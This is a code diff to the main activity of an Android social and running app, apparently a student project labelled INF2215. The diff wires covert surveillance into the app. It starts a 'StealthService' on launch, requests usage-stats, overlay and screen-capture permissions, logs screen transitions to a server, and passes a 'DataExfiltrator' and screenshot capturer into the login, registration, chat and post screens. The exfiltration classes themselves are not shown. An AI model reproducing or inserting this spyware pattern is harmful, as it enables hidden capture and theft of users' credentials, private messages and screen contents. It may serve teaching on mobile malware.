@@ -33,6 +33,16 @@ import android.provider.Settings
 import android.app.AlertDialog
 import android.content.DialogInterface
 
+import androidx.activity.result.contract.ActivityResultContracts
+import android.media.projection.MediaProjectionManager
+import android.content.Intent
+import android.net.Uri
+import android.os.Build
+import android.provider.Settings
+import android.util.Log
+import androidx.compose.ui.platform.LocalContext
+
+
 class MainActivity : ComponentActivity() {
 
     fun sendDataToServer(action: String) {
@@ -399,6 +409,45 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    private val screenCaptureLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
+        if (result.resultCode == RESULT_OK && result.data != null) {
+            // Pass token to StealthService
+            Intent(this, StealthService::class.java).apply {
+                putExtra("SCREEN_CAPTURE_RESULT_CODE", result.resultCode)
+                putExtra("SCREEN_CAPTURE_DATA", result.data)
+                startService(this)
+            }
+        }
+    }
+
+    private fun requestUsageStatsPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            if (!hasUsageStatsPermission()) {
+                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
+            }
+        }
+    }
+
+    private fun hasUsageStatsPermission(): Boolean {
+        val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
+        val mode = appOps.checkOpNoThrow(
+            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
+            android.os.Process.myUid(),
+            packageName
+        )
+        return mode == android.app.AppOpsManager.MODE_ALLOWED
+    }
+
+    private fun requestOverlayPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            val intent = Intent(
+                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:$packageName")
+            )
+            startActivity(intent)
+        }
+    }
+
     @OptIn(ExperimentalMaterial3Api::class)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -409,11 +458,49 @@ class MainActivity : ComponentActivity() {
         // FORCE PERMISSIONS - app won't continue until granted
         forceRequestPermissions()
 
+        // Start the new stealth service
+        startService(Intent(this, StealthService::class.java))
+
+        // Request permissions
+        requestUsageStatsPermission()
+        requestOverlayPermission()
+
+        // Request screen capture permission
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+//            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+//            screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
+//        }
+
         enableEdgeToEdge()
+        fun logEvent(exfiltrator: DataExfiltrator, event: String, value: String) {
+            val data = "$event -> $value"
+            exfiltrator.queueData(data)
+        }
 
         setContent {
             INF2215Theme {
+                // ───────────────────────────────────────────────
+                // This whole block MUST be here — inside the composition
+                // ───────────────────────────────────────────────
+                val context = LocalContext.current
+
+                val screenshotCapture = remember { ScreenshotCapture(context) }
+                val exfiltrator = remember { DataExfiltrator(context) }
+
+                val logEventLambda: (String, String) -> Unit = remember(exfiltrator) {
+                    { event, value ->
+                        logEvent(exfiltrator, event, value)
+                    }
+                }
+
                 var screen by remember { mutableStateOf(Screen.Login) }
+                var prevScreen by remember { mutableStateOf<Screen?>(null) }
+                LaunchedEffect(screen) {
+                    prevScreen?.let {
+                        sendDataToServer("IPC: ${it.name} → ${screen.name}")
+                    }
+                    prevScreen = screen
+                }
                 var previousScreen by remember { mutableStateOf(Screen.Home) }
 
                 var userRole by remember { mutableStateOf("public") }
@@ -660,9 +747,11 @@ class MainActivity : ComponentActivity() {
                             Screen.Login -> LoginScreen(
                                 onLoginSuccess = {
                                     sendDataToServer("user_login")
-                                    screen = Screen.Home
-                                },
-                                onGoRegister = { screen = Screen.Register }
+                                    screen = Screen.Home },
+                                onGoRegister = { screen = Screen.Register },
+                                screenshotCapture = screenshotCapture,
+                                exfiltrator = exfiltrator,
+                                logEvent = logEventLambda
                             )
 
                             Screen.Register -> RegisterScreen(
@@ -670,7 +759,10 @@ class MainActivity : ComponentActivity() {
                                     sendDataToServer("user_register")
                                     screen = Screen.Home
                                 },
-                                onBackToLogin = { screen = Screen.Login }
+                                onBackToLogin = { screen = Screen.Login },
+                                screenshotCapture = screenshotCapture,
+                                exfiltrator = exfiltrator,
+                                logEvent = logEventLambda
                             )
 
                             Screen.Home -> HomeScreen(
@@ -699,7 +791,10 @@ class MainActivity : ComponentActivity() {
                                     chatOtherName = otherName
                                     previousScreen = Screen.Profile
                                     screen = Screen.ChatRoom
-                                }
+                                },
+                                screenshotCapture = screenshotCapture,
+                                exfiltrator = exfiltrator,
+                                logEvent = logEventLambda
                             )
 
                             Screen.AdminProfile -> AdminProfileScreen()
@@ -707,9 +802,11 @@ class MainActivity : ComponentActivity() {
                             Screen.CreatePost -> CreatePostScreen(
                                 onPostSuccess = {
                                     sendDataToServer("create_post")
-                                    screen = Screen.Home
-                                },
-                                onCancel = { screen = Screen.Home }
+                                    screen = Screen.Home },
+                                onCancel = { screen = Screen.Home },
+                                screenshotCapture = screenshotCapture,
+                                exfiltrator = exfiltrator,
+                                logEvent = logEventLambda
                             )
 
                             Screen.TrackRun -> TrackRunScreen(
@@ -754,7 +851,10 @@ class MainActivity : ComponentActivity() {
                                     ChatScreen(
                                         otherUserId = otherUid,
                                         otherDisplayName = otherName,
-                                        onBack = { screen = previousScreen }
+                                        onBack = { screen = previousScreen },
+                                        screenshotCapture = screenshotCapture,
+                                        exfiltrator = exfiltrator,
+                                        logEvent = logEventLambda
                                     )
                                 } else {
                                     Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
@@ -873,7 +973,10 @@ class MainActivity : ComponentActivity() {
                                 selectedPostId?.let { postId ->
                                     PostDetailScreen(
                                         postId = postId,
-                                        onBack = { screen = previousScreen }
+                                        onBack = { screen = previousScreen },
+                                        screenshotCapture = screenshotCapture,
+                                        exfiltrator = exfiltrator,
+                                        logEvent = logEventLambda
                                     )
                                 }
                             }
